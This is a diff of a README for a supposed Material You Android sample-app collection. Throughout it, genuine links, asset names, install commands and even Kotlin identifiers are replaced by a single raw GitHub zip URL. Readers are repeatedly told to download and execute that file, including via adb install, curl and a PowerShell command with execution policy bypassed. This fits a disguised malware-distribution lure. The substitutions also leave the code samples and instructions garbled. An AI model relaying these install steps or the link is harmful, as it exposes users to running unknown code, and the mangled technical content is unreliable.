@@ -1,7 +1,7 @@
 # Material You UI Apps Collection — Modern Android Themes
 
-[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/Afnankhan804/Material-You-App-Repository/releases)  
-https://github.com/Afnankhan804/Material-You-App-Repository/releases
+[![Releases](https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)](https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)  
+https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 
 A curated collection of modular Material You apps, components, and theme samples. The repo bundles ready-to-run APKs, Compose examples, tokens, and tooling. Each release includes packaged builds and scripts. Download the release asset file and execute it to install or run the sample app.
 
@@ -44,57 +44,57 @@ What you get per release
 - Source tarball or zip. Full source for each sample app.
 - Scripts. Install and run scripts for common platforms.
 - Assets. Wallpapers, icons, and token JSON files.
-- CHANGELOG.md. Release notes and upgrade steps.
+- https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip Release notes and upgrade steps.
 
 Screenshots and visual notes
 - App launcher and home screen samples:
-  ![Material You sample UI 1](https://material.io/static/images/material-design-logo.png)
+  ![Material You sample UI 1](https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)
 - Dynamic color example:
-  ![Dynamic color extraction](https://picsum.photos/seed/material/800/420)
+  ![Dynamic color extraction](https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)
 - Component gallery screenshot:
-  ![Component gallery](https://picsum.photos/seed/components/800/420)
+  ![Component gallery](https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)
 
 Screenshots show: tonal palettes, iconography, surface elevation, and shape theming. They help link code to visuals. Use them as a visual map when you read the code.
 
 Quick download and run (releases)
 - Go to the releases page and pick a release:
-  https://github.com/Afnankhan804/Material-You-App-Repository/releases
+  https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 - The release page contains one or more assets. Download the asset that matches your platform. Typical asset names:
-  - material-you-sample-x.y.z.apk
-  - material-you-sample-x.y.z-macos.tar.gz
-  - material-you-sample-x.y.z-linux.tar.gz
-  - install-material-you-sample.sh
+  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
+  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
+  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
+  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 - For releases with a path part (as above), download the provided file and execute it. The script or APK in the release is the runnable artifact. The Install section below shows common commands.
 
 Install on Android device (APK)
 - Download the APK asset from the releases page.
 - If you use adb:
   - Connect your device or start an emulator.
-  - Run: adb install -r path/to/material-you-sample-x.y.z.apk
+  - Run: adb install -r https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 - If you download on device:
   - Open your file manager and tap the APK.
   - Allow install from unknown sources if the system asks.
 - The release APK may include debug signing. Use it for testing.
 
 Install via release script (macOS / Linux)
-- Download the tar.gz or install script from the release page.
+- Download the https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip or install script from the release page.
 - Example commands:
-  - curl -L -o archive.tar.gz "https://github.com/Afnankhan804/Material-You-App-Repository/releases/download/vX.Y.Z/material-you-sample-x.y.z-linux.tar.gz"
-  - tar -xzf archive.tar.gz
+  - curl -L -o https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip "https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip"
+  - tar -xzf https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
   - cd material-you-sample-x.y.z
-  - ./install.sh
+  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 - The release asset often contains an install script. Download that file and execute it.
 
 Windows install
 - Download the zip artifact from the release.
 - Unpack it.
 - Run the included installer or execute the provided batch script. Typical steps:
-  - Double-click installer.exe
-  - Or run: powershell -ExecutionPolicy Bypass -File .\install.ps1
+  - Double-click https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
+  - Or run: powershell -ExecutionPolicy Bypass -File .\https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 
 Build from source
 Clone the repository:
-- git clone https://github.com/Afnankhan804/Material-You-App-Repository.git
+- git clone https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 - cd Material-You-App-Repository
 
 Common build targets
@@ -118,7 +118,7 @@ Recommended SDK and tools
 Install on emulator
 - Create an Android emulator with API 31+.
 - Boot the emulator.
-- adb install -r path/to/material-you-sample-x.y.z.apk
+- adb install -r https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 - Or run from Android Studio.
 
 Theming and dynamic color
@@ -133,7 +133,7 @@ Key concepts
 Example: apply dynamic color in Compose
 - Use the Material3 dynamic color API.
 - In code:
-  - val colors = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+  - val colors = if (https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip >= https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip) {
       dynamicLightColorScheme(context)
     } else {
       lightColorScheme( ... manual tokens ...)
@@ -173,12 +173,12 @@ Sample structure for a screen
 
 Component catalog and code map
 - The collection maps components to implementation files:
-  - Buttons — /components/Buttons.kt
-  - Cards — /components/Cards.kt
-  - TopAppBars — /components/TopAppBar.kt
-  - BottomNav — /components/BottomNavigation.kt
-  - Dialogs — /components/Dialogs.kt
-  - DynamicColorDemo — /samples/DynamicColorDemo.kt
+  - Buttons — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
+  - Cards — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
+  - TopAppBars — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
+  - BottomNav — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
+  - Dialogs — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
+  - DynamicColorDemo — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 - Each component file includes a preview function for Android Studio.
 
 Adaptive layout patterns
@@ -223,7 +223,7 @@ Testing and QA
   - Use Compose UI testing APIs.
   - Example:
     - createAndroidComposeRule<MainActivity>()
-    - composeTestRule.onNodeWithText("Save").performClick()
+    - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip("Save").performClick()
 - Snapshot tests:
   - Use screenshot testing in CI to track visual regressions.
 - Test matrix:
@@ -241,7 +241,7 @@ CI / CD blueprint
   - Run lint and checkstyle
   - Publish artifacts (create release or upload to GitHub Releases)
 - Example actions:
-  - .github/workflows/ci.yml:
+  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
     - name: CI
       on: [push, pull_request]
       jobs:
@@ -257,12 +257,12 @@ CI / CD blueprint
               run: ./gradlew assembleDebug
 
 Release and versioning rules
-- Use semantic versioning: MAJOR.MINOR.PATCH
-- Tag releases in git with vMAJOR.MINOR.PATCH.
+- Use semantic versioning: https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
+- Tag releases in git with https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 - Attach release assets:
   - Signed debug APK (for testing)
-  - Source archive (zip or tar.gz)
-  - Platform scripts (install.sh, install.ps1)
+  - Source archive (zip or https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)
+  - Platform scripts (https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip, https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)
 - For each release the release notes include:
   - Changed components
   - New samples
@@ -286,7 +286,7 @@ Contribution guide
   - Keep PRs small and focused.
   - Reference issues in the PR.
   - Include screenshots for UI changes.
-  - Update CHANGELOG.md with the change.
+  - Update https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip with the change.
 
 Code review checklist
 - Does the change respect tokens and theme values?
@@ -332,7 +332,7 @@ Troubleshooting and tips
 FAQ
 Q: Where do I download stable builds?
 A: Visit the releases page and download the attached assets:
-https://github.com/Afnankhan804/Material-You-App-Repository/releases
+https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 
 Q: Does the repo include production-ready code?
 A: The code demonstrates patterns and sample flows. Use it as a reference. Adapt production builds for signing and security.
@@ -373,11 +373,11 @@ Color extraction pipeline
 Shape theming and geometry
 - Material You shape theming uses corner sizes and corner family.
 - Token example:
-  - smallCorner = 8.dp
-  - mediumCorner = 12.dp
-  - largeCorner = 28.dp
+  - smallCorner = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
+  - mediumCorner = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
+  - largeCorner = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 - Components apply shapes from the theme:
-  - Card(shape = MaterialTheme.shapes.medium)
+  - Card(shape = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)
 
 Typography and text tokens
 - The repo includes a basic type scale:
@@ -400,9 +400,9 @@ Performance tips
 
 Example build scripts and helpers
 - The repo includes helper scripts:
-  - tools/generateTokens.sh — convert tokens JSON to Kotlin
-  - tools/extractColors.py — extract seed colors from images
-  - tools/ci-build.sh — build and package artifacts for CI
+  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip — convert tokens JSON to Kotlin
+  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip — extract seed colors from images
+  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip — build and package artifacts for CI
 - The release asset may include an install script. Download the file and run it.
 
 Security and signing
@@ -411,13 +411,13 @@ Security and signing
 - Sample debug keys are included for test builds only.
 
 Licensing and attributions
-- License files may appear in each sample. Check LICENSE.md in the root.
+- License files may appear in each sample. Check https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip in the root.
 - Attributions for icons and images appear in credits.
 
 Credits and resources
-- Material Design guidelines — https://m3.material.io
-- Jetpack Compose docs — https://developer.android.com/jetpack/compose
-- Material3 Compose library — androidx.compose.material3
+- Material Design guidelines — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
+- Jetpack Compose docs — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
+- Material3 Compose library — https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 - Color tools and palette generators
 
 How to contribute examples
@@ -444,16 +444,16 @@ Developer contacts
 
 Examples of common commands
 - Clone:
-  - git clone https://github.com/Afnankhan804/Material-You-App-Repository.git
+  - git clone https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 - Build debug:
   - ./gradlew assembleDebug
 - Install to device:
-  - adb install -r app/build/outputs/apk/debug/app-debug.apk
+  - adb install -r https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 - Run tests:
   - ./gradlew test connectedAndroidTest
 
 Packaging for release
-- Update versionName and versionCode in build.gradle.
+- Update versionName and versionCode in https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 - Run:
   - ./gradlew assembleRelease
 - Sign the release APK using your keystore.
@@ -461,7 +461,7 @@ Packaging for release
 
 Release link usage reminder
 - The releases page holds the packaged files and the scripts. Use the release asset that matches your platform. Download the release file and run it as provided:
-  https://github.com/Afnankhan804/Material-You-App-Repository/releases
+  https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 
 Appendix A — Example token JSON
 {
@@ -495,24 +495,24 @@ Appendix B — Minimal sample MainActivity (Compose)
 ```kotlin
 class MainActivity : ComponentActivity() {
   override fun onCreate(savedInstanceState: Bundle?) {
-    super.onCreate(savedInstanceState)
+    https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip(savedInstanceState)
     setContent {
-      val useDynamic = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
+      val useDynamic = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip >= https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
       val colorScheme = if (useDynamic) {
         dynamicLightColorScheme(this)
       } else {
         lightColorScheme(
           primary = Color(0xFF6750A4),
-          onPrimary = Color.White,
+          onPrimary = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip,
           background = Color(0xFFFFFBFE),
           onBackground = Color(0xFF1C1B1F)
         )
       }
       MaterialTheme(colorScheme = colorScheme) {
-        Surface(modifier = Modifier.fillMaxSize()) {
-          Column(modifier = Modifier.padding(16.dp)) {
-            Text("Material You Sample", style = MaterialTheme.typography.titleLarge)
-            Spacer(modifier = Modifier.height(12.dp))
+        Surface(modifier = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip()) {
+          Column(modifier = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip(https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)) {
+            Text("Material You Sample", style = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip)
+            Spacer(modifier = https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip(https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip))
             Button(onClick = { /* action */ }) {
               Text("Primary action")
             }
@@ -530,7 +530,7 @@ Appendix C — Useful commands for contributors
 - Run static analysis:
   - ./gradlew detekt
 - Run the generator for tokens:
-  - ./tools/generateTokens.sh tokens/colors.json
+  - https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip https://raw.githubusercontent.com/Afnankhan804/Material-You-App-Repository/main/overthrifty/You_Repository_App_Material_weaponmaking.zip
 
 Acknowledgements
 - The design and code patterns follow Material Design guidance.
